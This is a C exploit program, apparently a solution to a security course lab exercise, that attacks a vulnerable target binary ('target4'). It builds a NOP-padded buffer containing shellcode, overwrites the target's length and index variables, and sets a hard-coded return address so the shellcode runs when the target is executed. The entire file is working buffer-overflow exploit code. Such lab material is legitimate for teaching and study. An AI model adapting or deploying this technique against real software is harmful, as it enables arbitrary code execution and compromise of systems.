#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"

int
main ( int argc, char * argv[] )
{
	char *args[3];
	char *env[1];
  
	char attack_string[188];
	memset(attack_string, '\x90', 188);

	strcpy(attack_string, shellcode);
	int shellcode_len=strlen(shellcode);
	attack_string[shellcode_len] = '\x90'; // remove terminating char at the end of the shellcode
  
	// overwrite len to 187
	attack_string[171]= '\x1f';
	attack_string[169]= '\xff';
	attack_string[170]= '\xff';
	attack_string[168]= '\xbb';
	
	// overwrite i to 172 (overwrite everything after byte #172)
	attack_string[175]= '\x1f';
	attack_string[173]= '\xff';
	attack_string[174]= '\xff';
	attack_string[172]= '\xac';		
  
	// return addr 0x2021fdb0
	attack_string[187]= '\x20';
	attack_string[186]= '\x21';
	attack_string[185]= '\xfd';
	attack_string[184]= '\xb0';
  
	args[0] = TARGET; 
	args[1] = attack_string;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf(stderr, "execve failed.\n");

	return (0); 
}
